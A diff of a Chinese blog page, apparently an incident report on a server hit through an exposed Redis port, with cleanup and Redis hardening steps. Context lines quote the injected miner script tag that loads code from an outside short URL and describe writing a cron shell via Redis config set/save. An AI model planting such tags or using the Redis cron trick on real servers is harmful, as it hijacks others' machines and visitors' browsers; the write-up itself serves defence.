@@ -520,7 +520,6 @@
 服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。
 服务器上所有站点使用宝塔面板面板管理，所以可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。
 网站无法加载，会出现浏览器卡死的情况。
-
 </pre>
 </div>
 </div>
@@ -529,8 +528,8 @@
 <div class="outline-text-3" id="text-orgf948ee5">
 <pre class="example">
 下面陈述被攻击后的表象：
-
 </pre>
+
 <ul class="org-ul">
 <li>服务器资源被大量占用，资源占用率飙升；</li>
 <li>服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('&lt;script src="<a href="http://t.cn/EvlonFh">http://t.cn/EvlonFh</a>"&gt;&lt;/script&gt;&lt;script&gt;OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")&lt;/script&gt;');）</li>
@@ -555,7 +554,6 @@
 攻击者通过redis命令 config set与save完成入侵过程.使用redis-cli -h &lt;ip&gt; &lt;port&gt; 登录服务redis-server，
 将redis的数据文件改到/var/spool/cron/root文件中，再通save 命令将定时任务shell脚本写入到/var/spool/cron/root 中，
 完成定时执行shell脚本，来实现提权及其它操作。
-
 </pre>
 </div>
 </div>
@@ -564,8 +562,8 @@
 <div class="outline-text-3" id="text-org8447931">
 <pre class="example">
 1. 整理清理脚本
-
 </pre>
+
 <div class="org-src-container">
 <pre class="src src-shell" id="orgf2f02e5"><span style="color: #75715E;"># </span><span style="color: #75715E;">&#20808;&#20851;&#25481;redis&#31471;&#21475;</span>
 iptables -A INPUT -p tcp --dport 6379 -j DROP
@@ -627,7 +625,6 @@ find / -type f -name <span style="color: #E6DB74;">'*.js'</span> |xargs fgrep -s
 2. 恢复服务器中的js文件(其中grep的参数为小写的L)
 方法一：删除站点所有感染 js 文件，从代码仓库pull，重新上传部署。
 方法二：# find / -name '*.js' | xargs grep -l f4ce9 | xargs sed -i '/f4ce9/d'
-
 </pre>
 </div>
 </div>
@@ -639,15 +636,15 @@ find / -type f -name <span style="color: #E6DB74;">'*.js'</span> |xargs fgrep -s
 只监听内网的IP，然后在iptables里面限制访问的主机：在/etc/redis/redis.conf中配置如下：
 bind 192.168.1.100
 如果服务只需要本机访问就直接监听127.0.0.1的回环地址就可以了。
-
 </pre>
+
 
 <pre class="example">
 2. 设置防火墙
 如果需要其他机器访问，或者设置了slave模式，那就记得加上相应的防火墙设置，命令如下：
 iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT
-
 </pre>
+
 
 <pre class="example">
 3. 禁止root用户启动redis
@@ -655,28 +652,28 @@ iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT
 edis crackit 漏洞就是利用root用户的权限来替换或者增加authorized_keys，来获取root登录权限的。
 使用root切换到redis用户启动服务:
 useradd -s /sbin/nolog -M redissetsid sudo -u redis /usr/bin/redis-server /etc/redis/redis.conf
-
 </pre>
+
 
 <pre class="example">
 4. 限制redis文件目录访问权限
 设置redis的主目录权限为700,如果redis配置文件独立于redis主目录,权限修过为600,因为redis密码明文存储在配置文件中。
-
 </pre>
+
 
 <pre class="example">
 5. 避免使用熟知的端口,降低被初级扫描的风险
 在/etc/redis/redis.conf中配置如下：
 找到port 6379这行，把6379改为9999，记得iptables对应的端口要修改
-
 </pre>
+
 
 <pre class="example">
 6. 开启redis密码认证,并设置高复杂度密码
 redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。
 redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。 
-
 </pre>
+
 
 <pre class="example">
 7. 禁用或者重命名危险命令
@@ -691,7 +688,6 @@ rename-command FLUSHDB ""
 rename-command FLUSHALL ""
 上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，
 我们自己却容易记住的的名字。保存之后，执行/etc/init.d/redis-server restart 重启生效。
-
 </pre>
 </div>
 </div>
@@ -857,7 +853,7 @@ rename-command FLUSHALL ""
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-count">43</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -868,7 +864,7 @@ rename-command FLUSHALL ""
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">14</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -879,7 +875,7 @@ rename-command FLUSHALL ""
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/">
-                <span class="site-state-item-count">55</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
